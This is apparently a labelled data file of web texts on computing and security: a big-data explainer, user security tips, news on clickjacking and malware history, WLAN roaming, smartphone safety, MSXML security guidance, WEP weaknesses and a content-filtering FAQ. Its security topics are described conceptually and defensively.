{"text": "Big Data – What Is It?\nBig data is a popular term used to describe the exponential growth, availability and use of information, both structured and unstructured. Much has been written on the big data trend and how it can serve as the basis for innovation, differentiation and growth.\nAccording to IDC, it is imperative that organizations and IT leaders focus on the ever-increasing volume, variety and velocity of information that forms big data.1\n- Volume. Many factors contribute to the increase in data volume – transaction-based data stored through the years, text data constantly streaming in from social media, increasing amounts of sensor data being collected, etc. In the past, excessive data volume created a storage issue. But with today's decreasing storage costs, other issues emerge, including how to determine relevance amidst the large volumes of data and how to create value from data that is relevant.\n- Variety. Data today comes in all types of formats – from traditional databases to hierarchical data stores created by end users and OLAP systems, to text documents, email, meter-collected data, video, audio, stock ticker data and financial transactions. By some estimates, 80 percent of an organization's data is not numeric! But it still must be included in analyses and decision making.\n- Velocity. According to Gartner, velocity \"means both how fast data is being produced and how fast the data must be processed to meet demand.\" RFID tags and smart metering are driving an increasing need to deal with torrents of data in near-real time. Reacting quickly enough to deal with velocity is a challenge to most organizations.\nBig data according to SAS\nAt SAS, we consider two other dimensions when thinking about big data:\n- Variability. In addition to the increasing velocities and varieties of data, data flows can be highly inconsistent with periodic peaks. Is something big trending in the social media? Perhaps there is a high-profile IPO looming. Maybe swimming with pigs in the Bahamas is suddenly the must-do vacation activity. Daily, seasonal and event-triggered peak data loads can be challenging to manage – especially with social media involved.\n- Complexity. When you deal with huge volumes of data, it comes from multiple sources. It is quite an undertaking to link, match, cleanse and transform data across systems. However, it is necessary to connect and correlate relationships, hierarchies and multiple data linkages or your data can quickly spiral out of control. Data governance can help you determine how disparate data relates to common definitions and how to systematically integrate structured and unstructured data assets to produce high-quality information that is useful, appropriate and up-to-date.\nUltimately, regardless of the factors involved, we believe that the term big data is relative; it applies (per Gartner’s assessment) whenever an organization’s ability to handle, store and analyze data exceeds its current capacity.\nExamples of big data\n- RFID (radio frequency ID) systems generate up to 1,000 times the data of conventional bar code systems. Tweet\n- 10,000 payment card transactions are made every second around the world.2 Tweet\n- Walmart handles more than 1 million customer transactions an hour.3 Tweet\n- 340 million tweets are sent per day. That's nearly 4,000 tweets per second.4 Tweet\n- Facebook has more than 901 million active users generating social interaction data.5 Tweet\n- More than 5 billion people are calling, texting, tweeting and browsing websites on mobile phones. Tweet\nUses for big data\nSo the real issue is not that you are acquiring large amounts of data (because we are clearly already in the era of big data). It's what you do with your big data that matters. The hopeful vision for big data is that organizations will be able to harness relevant data and use it to make the best decisions.\nTechnologies today not only support the collection and storage of large amounts of data, they provide the ability to understand and take advantage of its full value, which helps organizations run more efficiently and profitably. For instance, with big data and big data analytics, it is possible to:\n- Analyze millions of SKUs to determine optimal prices that maximize profit and clear inventory.\n- Recalculate entire risk portfolios in minutes and understand future possibilities to mitigate risk.\n- Mine customer data for insights that drive new strategies for customer acquisition, retention, campaign optimization and next best offers.\n- Quickly identify customers who matter the most.\n- Generate retail coupons at the point of sale based on the customer's current and past purchases, ensuring a higher redemption rate.\n- Send tailored recommendations to mobile devices at just the right time, while customers are in the right location to take advantage of offers.\n- Analyze data from social media to detect new market trends and changes in demand.\n- Use clickstream analysis and data mining to detect fraudulent behavior.\n- Determine root causes of failures, issues and defects by investigating user sessions, network logs and machine sensors.\n\"High-performance analytics, coupled with the ability to score every record and feed it into the system electronically, can identify fraud faster and more accurately.\"\nMany organizations are concerned that the amount of amassed data is becoming so large that it is difficult to find the most valuable pieces of information.\n- What if your data volume gets so large and varied you don't know how to deal with it?\n- Do you store all your data?\n- Do you analyze it all?\n- How can you find out which data points are really important?\n- How can you use it to your best advantage?\nUntil recently, organizations have been limited to using subsets of their data, or they were constrained to simplistic analyses because the sheer volumes of data overwhelmed their processing platforms. What is the point of collecting and storing terabytes of data if you can't analyze it in full context, or if you have to wait hours or days to get results? On the other hand, not all business questions are better answered by bigger data.\nYou now have two choices:\n- Incorporate massive data volumes in analysis. If the answers you are seeking will be better provided by analyzing all of your data, go for it. The game-changing technologies that extract true value from big data – all of it – are here today. One approach is to apply high-performance analytics to analyze the massive amounts of data using technologies such as grid computing, in-database processing and in-memory analytics.\n- Determine upfront which big data is relevant. Traditionally, the trend has been to store everything (some call it data hoarding) and only when you query the data do you discover what is relevant. We now have the ability to apply analytics on the front end to determine data relevance based on context. This analysis can be used to determine which data should be included in analytical processes and which can be placed in low-cost storage for later availability if needed.\n\" Now you can run hundreds and thousands of models at the product level – at the SKU level – because you have the big data and analytics to support those models at that level.\"\nA number of recent technology advancements are enabling organizations to make the most of big data and big data analytics:\n- Cheap, abundant storage and server processing capacity.\n- Faster processors.\n- Affordable large-memory capabilities, such as Hadoop.\n- New storage and processing technologies designed specifically for large data volumes, including unstructured data.\n- Parallel processing, clustering, MPP, virtualization, large grid environments, high connectivity and high throughputs.\n- Cloud computing and other flexible resource allocation arrangements.\nBig data technologies not only support the ability to collect large amounts of data, they provide the ability to understand it and take advantage of its value. The goal of all organizations with access to large data collections should be to harness the most relevant data and use it for optimized decision making.\nIt is very important to understand that not all of your data will be relevant or useful. But how can you find the data points that matter most? It is a problem that is widely acknowledged. \"Most businesses have made slow progress in extracting value from big data. And some companies attempt to use traditional data management practices on big data, only to learn that the old rules no longer apply,\" says Dan Briody, in the 2011 Economist Intelligence Unit's publication, \"Big Data: Harnessing a Game-Changing Asset.\"\nBig data solutions from SAS\nHow can you make the most of all that data, now and in the future? It is a twofold proposition. You can only optimize your success if you weave analytics into your big data solution. But you also need analytics to help you manage the big data itself.\nThere are several key technologies that can help you get a handle on your big data, and more important, extract meaningful value from it.\n- Information management for big data. Many vendors look at big data as a discussion related to technologies such as Hadoop, NoSQL, etc. SAS takes a more comprehensive data management/data governance approach by providing a strategy and solutions that allow big data to be managed and used more effectively.\n- High-performance analytics. By taking advantage of the latest parallel processing power, high-performance analytics lets you do things you never thought possible because the data volumes were just too large.\n- High-performance visual analytics. High-performance visual analytics lets you explore huge volumes of data in mere seconds so you can quickly identify opportunities for further analysis. Because it's not just that you have big data, it's the decisions you make with the data that will create organizational gains.\n- Flexible deployment options for big data. Flexible deployment models bring choice. High-performance analytics from SAS can analyze billions of variables, and those solutions can be deployed in the cloud (with SAS or another provider), on a dedicated high-performance analytics appliance or within your existing IT infrastructure, whichever best suits your organization's requirements.\n1 Source: IDC. \"Big Data Analytics: Future Architectures, Skills and Roadmaps for the CIO,\" September 2011.\n2 Source: American Bankers Association, March 2009\n3 Source: http://www.economist.com\n4 Source: http://blog.twitter.com\n5 Source: http://newsroom.fb.com/", "label": 1}
{"text": "SEAS Information Security Tips\nYou may feel like \"nothing I have on my computer is worth protecting, and they wouldn't bother with me anyway.\" But the truth is that a vulnerable computer can be the starting point for other attacks on our network. A hacker may not be interested in your computer specifically but rather may hijack your computer for use in remote proxy attacks such as a Distributed Denial of Service (DDoS), thereby becoming a threat to someone else's computer. Most attacks come from automated cracking programs which simply try to break into every machine on the Internet. When they break into one computer, they copy themselves to that machine so that it can try to break into yet more machines. So no one is choosing to break into your machine specifically, but your machine needs to be secure for the welfare of other computers on the network.\nBelow are some basic concepts and practices that will not only protect you and your data, but the whole Penn computing community. As an Eniac user, you are required to keep your account secure to protect the entire system.\n1. Don't open email attachments, unless you are expecting them. Don't send email attachments using any of the extensions listed in the Answers article on Prohibited Attachments, they will be interpreted as viruses and blocked. Email containing these types of attachments is automatically deleted and there is no way to recover it.\n2. Lock your computer when you are away from your desk in the office, lab, or college house, even just for a minute. To lock a Windows machine, press ctrl-alt-delete and click the \"Lock Computer\" button.\n3. Don't share your password with anyone. If you have a shared account, use a different password for it. Also, don't use the same password on different sites. For example, don't use the same password for your bank account and for your email. Don't write your passwords down. The best place to keep your passwords is in your head.\n4. Install and run Antivirus software and keep it up-to-date. Penn provides site-licensed copies of Symantec AntiVirus to Penn users at no cost. Visit http://www.upenn.edu/computing/virus/ to download a copy. Once it's installed, be sure to run \"LiveUpdate\" to get the latest virus signature files on a regular basis. You can set up LiveUpdate to automatically go out and get updates (see directions below)\nTo automate Symantec LiveUpdates:\nRight-click on the Symantec shield icon in the lower right corner of\nthe display and select \"Open Symantec Antivirus\". Select Schedule\nUpdates from the File pull-down menu. Put a check in the box next to\n\"Enable scheduled automatic updates\". Click the Schedule button.\nUnder Frequency, click the button next to Daily. Select a convenient\ntime for the updates to take place. Click OK.\n5. Keep your operating system patches up-to-date. It's recommended to run Windows Update regularly.\n6. Don't let anyone modify your account or your computer, unless you trust them.\n7. Make sure your system security settings are correct. Download and run Microsoft Baseline Security Analyzer. Microsoft released this as a response to the Code Red and Nimda worms a few years ago. It's designed to identify common security misconfigurations.\n8. Remove bad software - don't install spyware, peer-to-peer software, or \"toolbars\". Run Spybot Search and Destroy daily to detect and remove spyware. Update it weekly. (http://download.com.com/3000-8022-10122137.html)\n9. If someone gets a message with your address in the \"From\" line, this doesn't mean your account was broken into. Similarly, just because you get a bounced message from a message you never sent, doesn't mean your account was broken into. Delete these messages, they are spam.\n10. Run the \"Shields Up\" scan, an Internet security vulnerability profiling free service. This scan will identify exposed areas on your computer that intruders could use to probe and hack into. Open ports make it easy for intruders to steal your personal information, credit card numbers, and so forth through your computer's insecure connection to the Internet. Do what you can to fix the security problems the \"Shields Up\" scan reports. There is a lot of helpful information on the site. Go to \"Shields Up\" Scan\n11. Install a firewall on your computer. CETS technicians will install and set up a firewall on SEAS staff and faculty computers located in SEAS offices.\nOther Related Links\nIf you have any questions about computer security, please send mail to firstname.lastname@example.org. Please be as detailed as possible.", "label": 1}
{"text": ", SecurityFocus 2008-09-30\nWhat's the harm in clicking on a button?\nThat's the central question being discussed by security professionals following the cancellation of a presentation on user-interface overlays -- or \"clickjacking\" as some have dubbed the threat -- at last week's Open Web Application Security Project (OWASP) AppSec conference in New York City.\nOn Friday, the U.S. Computer Emergency Readiness Team (US-CERT) warned network administrators to beware of the technique.\n\"Clickjacking gives an attacker the ability to trick a user into clicking on something only barely or momentarily noticeable,\" the group stated. \"Therefore, if a user clicks on a web page, they may actually be clicking on content from another page.\"\nTwo researchers, Robert Hansen and Jeremiah Grossman, planned at AppSec to discuss the threat of using Web graphics to persuade a victim to click where an attacker wants on a page. The technique, which is also known as well as user-interface (UI) redressing and IFRAME overlay, can be used by an attacker to hide a button or link on a legitimate page, such as a bank's account page or Web mail application, using other Web content to mask the page's context.\nA Web user might think, for example, that they are clicking on a button to close a dialog box, when the button press in reality deletes all their e-mail messages in Gmail. Or, a user might believe they are clicking on a button to decline to take a survey, when they are actually transferring money from their bank. The technique could be used to raise an article's Digg score or get paid for a pay-for-click advertisement, said Grossman, the chief technology officer for Web security firm White Hat Security.\n\"The list is virtually endless and these are the more relatively harmless examples,\" he told SecurityFocus in an e-mail interview. \"Next consider that an attack can invisibly hover these buttons below the users mouse, so that when the clicks on something the visually see, they actually are clicking on something the attacker wants them to. Now, what could the bad guy potentially do with that ability? The more we researched, the worse the exploits become.\"\nHansen and Grossman canceled their presentation after demonstrating to software maker Adobe that one of its products could be affected by the attack.\n\"While they saw this issue as primarily a web browser issue, they showed us that one of their demos included an Adobe product,\" David Lenoe, a program manager for Adobe's Product Security Incident Response Team (PSIRT), said in a blog post. \"We worked together with Robert and Jeremiah to assess the impact of this issue, and they determined that it was in our customers best interest to refrain from making this issue public until Adobe and web browser vendors have a chance to provide a fix or fixes to our mutual customers.\"", "label": 1}
{"text": "PC virus celebrates 20th birthday\nMany unhappy returns\nAnalysis Today, 19 January is the 20th anniversary for the appearance of the first PC virus. Brain, a boot sector virus, was let loose in January 1986. Brain spread via infected floppy disks and was a relatively innocuous nuisance in contrast with modern Trojan, rootkits and other malware. The appearance of the first Windows malware nonetheless set in train a chain of events that led up to today's computer virus landscape.\nBoot sector viruses ceased to appear when floppy discs went out of fashion but they continued to be a nuisance between 1986 to 1995, when internet technology started to penetrate the consumer market. These types of viruses relied on people to exchange infected discs and virus outbreaks often took months to spread.\nThe creation of macro viruses, which exploited security weaknesses in Microsoft word and other applications, meant that malware outbreaks peaked after days instead of weeks and months. Macro viruses ruled the roost for around four years between 1995 and 1999 before email became the main vector for viral distribution.\nHarnessing the internet meant that the time it took the first email worms, such as the Love Bug, to spread dropped from days to hours. Email worms such as the Love Bug and Melissa caused widespread disruption and confusion in 1999 before they were brought to heel.\nBy 2001, network worms such as Blaster were created that automatically and indiscriminately infected Windows PCs without adequate protection. Email and network worms remain a problem today but the greatest problem these days is posed by key-logging Trojans designed to snoop on user's private information, such as online account details, and the many strains of malware that turn infected PCs into zombie drones under the control of hackers.\nThe biggest change over the last 20 years has been in the motives of virus writers rather than in the types of malware they've cooked up, according to anti-virus firm F-Secure.\n\"The most significant change has been the evolution of virus writing hobbyists into criminally operated gangs bent on financial gain,\" said F-Secure's chief research officer Mikko Hypponen. “This trend is showing no signs of stopping.\"\n\"There are already indications that malware authors will target laptop WLANs as the next vector for automatically spreading worms,\" he added. ®", "label": 1}
{"text": "WLAN Roaming - the basics\nEven if you keep the same IP address, things get complicated.\nWhen a WLAN client moves from the range of one Access Point (AP) to another in the same subnet, it needs to find the best AP, decide when to roam onto it, associate with it and do any authentication required, as per your security policies. Then the wired network has to relearn the location of the client, so that data can be sent to it. All of this takes time and this is without the client having to worry about getting a new IP address! The scanning and decision making part of the roaming process (see How to Make your WLAN roam faster) allows the client to find a new AP on an appropriate channel as the user moves. When this happens, the client must associate with the new AP. It must then, assuming that it is an 802.1x supplicant (see The EAP Heap), reauthenticate with the RADIUS server. This is transparent to the user - but the delay in this happening may not be. It can take up to a second for association and authentication to occur (see below for implications and solutions). IAPP\nThe next part of the process is for the rest of the network to be made aware that the client has shifted. This calls for AP to AP communication, which was never catered for in the original 802.11 spec. Vendors had their own way of passing updates; however 802.11f, the Inter-Access Point Protocol, has now been now published by the IEEE as a trial-use standard - it sits in this state for two years before being submitted as a full-use standard - to facilitate multi-vendor AP interoperability. IAPP calls for the new servicing AP to send out two packets onto the wired LAN. One of these is actually set with the source address of the client (the standard says this should be a broadcast, however some implementations still use unicast to the previous AP or a multicast) and is used by intervening switches to update their MAC address tables with the client’s new location. The other is an IAPP ADD-notify packet from the new AP to an IAPP multicast address that all APs subscribe to, which contains the MAC address of the station it has just associated. All APs will receive this packet, and the one that had been associated with that station will use the sequence number included to determine that this is newer information and remove the stale association from its internal table. IAPP provides for the sharing of information between APs. The format of this information is specified, as \"contexts\" but the actual content is not defined, so it’s not yet hugely useful as far as vendor interoperability is concerned. Also IAPP has no specific provision for security. Who Cares?\nSo, worst case, you’re probably looking at about one second where your client can’t be reached over the network. For a lot of clients and applications, this isn’t an issue. If you’re walking from one room to another carrying your laptop, and you want to use email or a web browser, it’s not a problem. In fact, most TCP-based applications will be able to handle this sort of hiccup (remember that in this instance there’s no address change). UDP applications are less able to handle interruptions, and unfortunately, these are the ones where a break would be most noticed by the user. The killer? Voice. Not only is VoWLAN UDP-based for the bearer traffic, but it’s also the one application where you are likely to be using it as you move between APs. And you are definitely going to notice a one second hit. Which is presumably why the vendors that are pushing fast roaming for 802.11 are the ones squarely behind the use of wireless handsets in an IP Telephony environment, such as Cisco, SpectraLink and Symbol. Related standards\nIn fact these are three of the companies behind the drive for a new IEEE Working Group to create a standard to handle faster Layer 2 roaming. There are several related standards and works-in-progress, but none that actually cover this specific aspect:\n- As already discussed, IAPP—802.11f—isn’t designed for speed.\n- 802.11i, the security standard (not yet ratified) has provision for secure fast handoff, but it’s too security specific for this requirement.\n- 802.11k—Radio Resource Management—might help in that it should cater for faster discovery of APs. Again, not yet finalised.\n- 802.21 isn’t specifically for wireless LANs at all. It’s aimed at the handoff between heterogeneous networks (wired, 802.11, Bluetooth) and while it will deal with inter-ESS roaming (ie subnet to subnet in a WLAN), it won’t speed up the Layer 2 process which is needed prior to any Layer 3 interaction. This was the P802 Handoff Study Group, and is just in the process of kicking off now.\nIn the meantime of course, there are proprietary solutions. The two parts that need to be speeded up to cut down outage times are the scanning process (to allow clients to find new suitable APs to associate to), and, specifically for security, a faster way of reauthenicating to cut out the RADIUS request/response process. There are things that can be done to speed up the time it takes for a client to find another suitable AP. An AP can maintain information on its adjacent APs, which it can pass to a client on request—this will give the client a better indication of usable channels to scan, for example. The biggest time saver, however, is reckoned to be in localising the 802.1x authentication process. Cisco has incorporated Fast Secure Roaming into its Wireless Domain Services (WDS) portfolio as part of its Structured Wireless Aware Networking offering, which in effect allows an AP on each local subnet to act as the authenticator for clients. When a client (or other AP) goes through the initial RADIUS authentication, it does it via one AP running WDS. This lets that AP establish shared keys between itself and every other entity in the L2 domain, and allows for quicker reauthentication. Plans are for this capability to be included in Cisco’s router/switch platforms later this year as part of its SWAN development. Symbol provides similar functionality in its hardware, while Airespace) also caters for fast roaming in its wireless switches and appliances, and companies such as Bluesocket, which use gateways to control pretty dumb APs, manage everything centrally. Proxim handles things differently, pre-authenticating clients to nearby APs as well as the one currently in use in preparation for the client moving. So before you get excited about Layer 3 roaming, make sure you understand how your vendor of choice implements it at Layer 2. If that bit’s not fast enough to stop you losing traffic, you’ll never be able to move across subnets. It’s likely to be years before there’s a usable standard in place and in the meantime while you can probably get APs from different vendors to work together, there’s no guarantee of interoperability if you want to turn on their various fast roaming options.", "label": 1}
{"text": "COMMON RISKS FOR SMARTPHONES\nWe usually do a good job of protecting our computers, but what about smartphones? Careless use can open up users to a lot of risks. Take a moment to consider each of these areas:\nLoss of device and information theft. Smartphones are small and can easily be lost or stolen. Unauthorized users may access your accounts, address lists, photos, and more to scam, harm, or embarrass you or your friends. They may leverage stored passwords to access your bank and credit card accounts, steal your money, or make credit card charges. They may also gain access to sensitive material.\nSocial engineering. A common mobile threat is social engineering. Whether via text message, image, or application (app) to download, an incoming communication may be an attempt to gain access to your information. A current example consists of a text message that comes from an unknown number telling you that if you click on the link provided, you will have access to thousands of free ringtones. If this sounds too good to be true, that is because it is. The link is a malicious link. Clicking on it will compromise the security of your smartphone.\nTMI (too much information). Guidelines for protecting privacy, safety, and reputation when sharing via computers also apply when sharing via smartphones.\nPublic Wi-Fi. Smartphones are susceptible to malware and hacking when leveraging unsecured public networks.\nBluetooth® and near field communications (NFC). Bluetooth is a wireless network technology that uses short-wave radio transmissions to transmit voice and data. NFC allows for smartphones to communicate with each other by simply touching (“bumping”) another smartphone, or being in close proximity to another smartphone with NFC capabilities or an NFC device. Risks with using NFC and Bluetooth include eavesdropping, through which the cybercriminal can intercept your personal data. NFC also has the risk of transferring viruses or other malware from one NFC-enabled device to another.\nSIMPLE STEPS TO PROTECT YOUR SMARTPHONE\nUpdate the operating system. Smartphones are computing devices that need to be updated. Updates often provide you with enhanced functionality and enriched features, as well as fixes to critical security vulnerabilities. Your smartphone manufacturer should notify you whenever an update is available.\nUse of security software is a must. As the smartphone market is increasing, so too is the amount of malware designed to attack smartphones. The software security solutions that are available for desktops and laptops are not as widely available for smartphones. A key protection is to use mobile security software and keep it up to date. Many of these programs can also locate a missing or stolen smartphone, back up your data, and even remotely wipe all data from the smartphone if it is reported stolen.\nPassword-protect your device. Enable strong password protection on your device and include a timeout that requires authentication after a period of inactivity. Secure the smartphone with a unique password – not the default one it came with. Do not share your password with others.\nThink before you click, download, forward, or open. Before responding, registering, downloading, or providing information, get the facts. No matter how tempting the text, image, or application is, if the download is not from a legitimate app store or the site of a trusted company, do not engage with the message.\nBe cautious with public Wi-Fi. Many smartphone users use free Wi-Fi hotspots to access data and keep their smartphone plan costs down. There are numerous threats associated with Wi-Fi hotspots. To be safe, avoid logging into accounts, especially financial accounts, when using public wireless networks.\nDisable Bluetooth and NFC capabilities when not in use. Capabilities such as Bluetooth and NFC can provide ease and convenience in using your smartphone. They can also provide an easy way for a nearby, unauthorized user to gain access to your data. Turn these features off when they are not required.\nEnable encryption. Enabling encryption on your smartphone is one of the best ways to safeguard information stored on the device, thwarting unauthorized access.\nSecurely dispose of your device. With the constant changes and upgrades in the smartphone market, many are upgrading their devices on a regular basis. It is important that you wipe the information from your smartphone before disposal. Additionally, make sure any secure digital (SD) cards are removed and erased. If you are not redeploying the subscriber identity module (SIM) card to another device, then make sure your personal information stored on the SIM card is erased or destroyed.\nFor additional information, please consult these resources:\nAbout.com – 14 Ways to Find a Stolen or Lost iPhone: http://ipod.about.com/od/iphonetroubleshooting/tp/14-Ways-To-Find-A-Lost-Or-Stolen-Iphone.htm\nFTC – How to Dispose Your Mobile Device Securely:\nUniversity of Northern Colorado:\nUS-CERT – Cyber Threats to Mobile Phones:\nSophos – Android Tool:\nMicrosoft – Secure Your Smartphone:\nOur web site provides links to other web sites for convenience and informational purposes only. By accessing these links you will be leaving First Farmers State Bank's website and entering a website hosted by another party. Please be advised that you will no longer be subject to, or under the protection of, the privacy policies of First Farmers State Bank's website. We encourage you to read and evaluate the privacy policies on the site you are entering.", "label": 1}
{"text": "Helper API Security\nThis topic describes security issues associated with XMLHTTP and ServerXMLHTTP. In addition, it provides some guidance for mitigating security exposure.\nThe following sections provide information about Helper API security, with an emphasis on XMLHTTP.\nUse XMLHTTP Only on the Client\nXMLHTTP should only be used on the client. Because XMLHTTP is marked safe for scripting, you call XMLHTTP from a script that is executed in the client-side Internet browser. Remember, you can use XMLHTTP and ServerXMLHTTP in any arbitrary script, inside or outside the browser. XMLHTTP is not safe for server-side implementation. Using XMLHTTP on the server means that you would use XMLHTTP via JScript, VBScript, C++, ASP, or ASP.NET. XMLHTTP is not thread-safe - it doesn't work for multi-threaded scenarios. If you use XMLHTTP, you will not receive an error, but your script may not perform properly. If you need XMLHTTP functionality on the server, you should use ServerXMLHTTP, not XMLHTTP.\nXMLHTTP Uses Cached Credentials\nXMLHTTP uses cached credentials if the user does not provide new credentials for every open method call in scenarios where specific credentials are used. Kiosk-style applications using XMLHTTP for multiple users that share a single login should always ensure that they terminate the Internet Explorer process when a user finishes a session. Furthermore, kiosk-style applications should never display the address bar as part of the application.\nSet the Site Object to Prevent Cross-Site and Cross-Domain Attacks\nWhen using XMLHTTP outside of Internet Explorer, it is important to set the Site object to prevent cross-site and cross-domain access on calls to the open Method (IXMLHTTPRequest). If the Site object is set, on redirects the redirect target is automatically checked against the initial Open request, and the standard cross-zone and cross-domain checks are applied.\nIn Internet Explorer scripting scenarios, the Site is set by Internet Explorer.\nValidate the URL Before Calling Open in XMLHTTP\nYou should not accept untrusted data to construct a URL when calling the Open method. You should validate the data first, making sure that the user is allowed to enter only approved addresses. This is particularly important in scenarios outside of Internet Explorer when the Site object is not set, where it is up to you to prevent cross-domain and cross-site attacks.\nSpoofing and Best-Fit Character Attacks\nIn spoofing attacks, an attacker attempts to craft information that dupes software to accept the information, such as an HTTP request, as coming from a trusted third party. One approach is for the attacker to construct a URL, perhaps using escaped characters, so that it looks like a URL to a trusted site, when in fact it is a URL to a site that has been set up with malicious intent. Another method is to use best-fit character attacks, where higher order characters in a string resource are mapped to lower order characters by certain programming interfaces, either by accident or deliberately. For example, an attacker might submit a URL to a site micrõsoft.com, with the intent that it be interpreted as microsoft.com.\nBoth types of attacks might be used by an attacker to dupe host identity, probe for string processing vulnerabilities in a system, or as part of a phishing attack. A phishing attack is one where an attacker pretends to be from a trusted source. Typically, it involves an attempt to fool the user into entering user names, passwords, and other private information.\nXMLHTTP and ServerXMLHTTP do not validate string input, including the HTTP Verb and URL, submitted in the Open() method call. If your application completely controls the URLs which are passed to XMLHTTP or ServerXMLHTTP methods, including request headers and query string, you might not be vulnerable to this class of attacks. You are vulnerable if you permit URLs or portions of URLs from an untrusted source, including user input.\nThe ServerXMLHTTP and XMLHTTP components follow strict rules to permit or deny redirects. Note that the general behaviors described below might change with Internet Explorer or Windows security settings. The principle rules are the following:\nFor ServerXMLHTTP, there is no zone redirect checking when in asynchronous mode.\nTo mitigate Redirect-based DoS attacks, XMLHTTP and ServerXMLHTTP components implement redirect limits.\nRedirects are typically permitted from zones of greater security to zones of equal and lesser security. For example, a redirect from a resource in the Intranet zone to Internet zone should succeed.\nRedirects are not permitted from zones of lesser security to zones of greater security. For example, a redirect from a resource in the Internet zone to the My Computer zone should fail.\nRedirects are not permitted across networking protocols.\nRedirects are not permitted across network domains.\nStrictness in MSXML 6.0 May Prevent Some Applications from Working\nIE defines five zones - MyComputer, Trusted Sites, Local intranet, Internet, and Restricted Sites. There are a number of rules regarding how a site in one zone can reference a site in another zone. For example, a site on the Internet can't reference a document on the Local intranet. In IE, and for applications that set the site explicitly, MSXML 6.0 is strict about URL redirection, and may prevent some user scenarios. In order to work around the security restrictions, the user can add the machine doing the redirection to the list of trusted sites on the machine where the redirection is taking place.\nError Messages May Reveal Data\nThe description of an error may reveal data. Error messages should not be exposed to callers that are not trusted. You should catch all errors and report errors with your own custom error messages.\nThe following sections provide information specific to ServerXMLHTTP.\nUse ServerXMLHTTP Only on the Server\nServerXMLHTTP should not be hosted in the browser; it is not marked safe for scripting.\nUse HTTPS to Provide Encryption for Sensitive Data\nServerXMLHTTP does not provide any encryption by default. You should use HTTPS connections to encrypt sensitive data during transmission.\nResponse Packages Are Insecure\nResponse packages are generally not secure (responseXML Property (ServerXMLHTTP/IServerXMLHTTPRequest), responseBody Property (ServerXMLHTTPRequest/IServerXMLHTTPRequest), and responseText Property (ServerXMLHTTP/IServerXMLHTTPRequest)). ServerXMLHTTP is used to retrieve information from other sites on the internet. When you retrieve data using it, you should know that the source of your information is trustworthy. Further, after using a response package, you should check for malicious data (both size and content). The ServerXMLHTTP object does not check for denial of service threats or bad data returned from response packages. ServerXMLHTTP should not be used to load untrusted XML in applications where denial of service is a concern.\nNo Secure-Base-URL Checking for Redirects\nServerXMLHTTP does not provide secure-base-URL checking for redirects. You should be aware that, when accessing untrusted locations with MSXML 6.0 ServerXMLHTTP or MSXML 3.0 ServerXMLHTTP in asynchronous mode, there are no checks on redirects. There are checks on the initial Open (both for the Open call and for any external references within the instance).\nSpoofing and Best-Fit Character Attacks\nServerXMLHTTP is vulnerable to both spoofing attacks and best-fit character attacks. For more details, see the discussion under XMLHTTP, earlier in this topic.", "label": 1}
{"text": "WEP is the encryption standard that comes with WiFi LANs. It uses RC4 encryption, which is the same as that used by the security built into standard web browsers (SSL). One might think, therefore, that it is sufficiently tried and tested to be trusted. Well, there's not a great deal wrong with RC4 -- but there is a great deal wrong with its implementation within WiFi. Put simply, it should not be used in this manner. (Technically, it is a stream cipher being used where a stream cipher should not be used. A block cipher would have been better for WLANs. But RC4 was easy and cheap to implement - and with 40 bit keys it was not subject to the then existent US export laws.)\nProblems with WEP were known at the end of year 2000. But in summer 2001, the well-known cryptographers Fluhrer, Mantin and Shamir (the 'S' of RSA) published a new paper in which “we show that RC4 is completely insecure in a common mode of operation which is used in the widely deployed Wired Equivalent Privacy protocol (WEP, which is part of the 802.11 standard), in which a fixed secret key is concatenated with known IV modifiers in order to encrypt different messages. Our new passive ciphertext-only attack on this mode can recover an arbitrarily long key in a negligible amount of time...”\nIn simple English, this is devastating news for the security of 802.11 WLANs. Basically, there is no security. It prompted Phil Belanger, past chairman and current marketing director of WECA, to comment: “We perceive this as serious and different from the previous attacks, and we're not going to say 'Don't worry about it'. However, we've always said that if privacy is a concern, you need to be using end-to-end security mechanisms, like virtual private networks, along with the WLAN.”\nWithout going into the technical details, RC4's implementation within WiFi means that in cryptographic terms it is a trivial matter to break the encryption. To make matters worse, there is a freely available hacking tool on the Internet (AirSnort) that can do all the hard work automatically. As a result, wireless LANs using WEP encryption are as vulnerable to script kiddies (wannabee hackers without their technical expertise) as they are to genuine hackers.\nBut of course the real problem isn't limited to traffic on the WLAN. Once a wireless terminal is compromised, the hacker has effectively bypassed any firewall and gained access to the entire corporate wired LAN.", "label": 1}
{"text": "Additions, clarifications, and corrections regarding the content of this document will be most graciously accepted: please send email to firstname.lastname@example.org.\nRating: Value judgments are used to categorize web sites based on their content. These ratings could use simple allowed/disallowed distinctions like those found in programs like CyberSitter or NetNanny, or they can have many values, as seen in ratings systems based on Platform for Internet Content Selection (PICS, see question 3.0).\nFiltering: With each request for information, the filtering software examines the resource that the user has requested. If the resource is on the \"not allowed\" list, or if it does not have the proper PICS rating, the filtering software tells the user that access has been denied and the browser does not display the contents of the web site.\nThe first content filters were stand-alone systems consisting of mechanisms for determining which sites should be blocked, along with software to do the filtering, all provided by a single vendor.\nThe other type of content filter is protocol-based. These systems consist of software that uses established standards for communicating ratings information across the Internet. Unlike stand-alone systems, protocol-based systems do not contain any information regarding which sites (or types of sites) should be blocked. Protocol-based systems simply know how to find this information on the Internet, and how to interpret it.\nFilters and ratings systems are seen as tools that would provide the cyberspace equivalent of the physical separations that are used to limit access to \"adult\" materials. In rating a site as objectionable, and refusing to display it on the user's computer screen, filters and ratings systems can be used to prevent children from seeing material that their parents find objectionable. In preventing access, the software acts as an automated version of the convenience-store clerk who refuses to sell adult magazines to high-school students.\nFilters are also used by businesses to prevent employees from accessing Internet resources that are either not work related or otherwise deemed inappropriate.\nWhether used in homes or workplaces, these tools raise serious privacy concerns.\nList-based blocking works by explicitly enumerating sites that should either be blocked or allowed. These lists are generally provided by filter vendors, who search for sites that meet criteria for being classified as either \"objectionable\" or \"family-friendly\".\nFiltering software vendors vary greatly in the amount of information and control they make available to users. Most vendors do not allow users to see the actual list of blocked sites, as it is considered to be a kind of trade secret. However, some vendors provide detailed descriptions of the criteria used to determine which sites should be blocked. Some vendors might allow users to add sites to the list, either in their own software or by sending sites to the vendor for review.\nStand-alone filtering tools also vary in the extent to which they can be configured by users. Some software packages allow users to make selections from a list of the categories they would like blocked. For example, a parent may wish to block explicit sex but not discussions of homosexuality as a life-style. Others might allow users to choose from a range of choices in any given topic area. For example, instead of simply blocking all nudity, these tools might allow users to chose to allow partial nudity while blocking full nudity.\nKeyword-based blocking uses text searches to categorize sites. If a site contains objectionable words or phrases, it will be blocked.\nFirst, these lists are incomplete. Due to the decentralized nature of the Internet, it's practically impossible to definitively search all Internet sites for \"objectionable\" material. Even with a paid staff searching for sites to 